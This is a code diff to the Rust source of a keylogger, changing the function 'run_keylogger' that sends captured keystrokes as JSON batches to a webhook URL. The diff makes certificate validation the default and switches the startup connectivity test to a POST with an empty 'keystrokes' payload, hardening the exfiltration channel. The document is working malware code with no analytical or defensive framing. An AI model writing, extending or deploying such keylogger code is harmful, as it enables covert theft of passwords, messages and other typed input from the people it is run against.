@@ -133,17 +133,17 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
             log_to_file(&format!("Initializing webhook client for URL: {}", url));
             
             // Check if user wants to accept invalid certificates (for testing services)
-            // Set RUST_KEY_ACCEPT_INVALID_CERTS=false to enforce strict certificate validation
+            // Set RUST_KEY_ACCEPT_INVALID_CERTS=true to accept self-signed certificates (less secure)
             let accept_invalid_certs = env::var("RUST_KEY_ACCEPT_INVALID_CERTS")
-                .unwrap_or_else(|_| "true".to_string())
-                .to_lowercase() != "false";
+                .unwrap_or_else(|_| "false".to_string())
+                .to_lowercase() == "true";
             
             if accept_invalid_certs {
-                log_to_file("⚠️  WARNING: Certificate validation is disabled for compatibility with testing services");
+                log_to_file("⚠️  WARNING: Certificate validation is DISABLED (insecure mode)");
                 log_to_file("⚠️  This makes the connection vulnerable to man-in-the-middle attacks");
-                log_to_file("⚠️  Set RUST_KEY_ACCEPT_INVALID_CERTS=false for strict validation");
+                log_to_file("⚠️  Only use this for testing with self-signed certificates");
             } else {
-                log_to_file("Certificate validation is enabled (strict mode)");
+                log_to_file("Certificate validation is enabled (secure mode - default)");
             }
             
             // Create HTTP client once
@@ -164,15 +164,23 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
                 }
             };
             
-            // Test initial connectivity
+            // Test initial connectivity with a minimal POST request
+            // This tests the same method that will be used for actual data transmission
             log_to_file("Testing initial connectivity to webhook...");
-            match client.get(&url).send() {
+            let test_payload = json!({
+                "keystrokes": []
+            });
+            match client.post(&url).json(&test_payload).send() {
                 Ok(resp) => {
-                    log_to_file(&format!("Initial connectivity test successful (HTTP {})", resp.status().as_u16()));
+                    let status = resp.status().as_u16();
+                    log_to_file(&format!("Initial connectivity test successful (HTTP {})", status));
+                    if status >= 400 {
+                        log_to_file(&format!("⚠️  Warning: Webhook returned error status {}. Check webhook configuration.", status));
+                    }
                 }
                 Err(e) => {
                     log_to_file(&format!("Initial connectivity test failed: {}", e));
-                    log_to_file("Will continue anyway - POST requests may still work");
+                    log_to_file("Will continue anyway - keystroke batches will be sent as they accumulate");
                     eprintln!("Warning: Initial webhook connectivity test failed: {}", e);
                     eprintln!("Continuing anyway - keystroke batches will be sent as they accumulate");
                 }
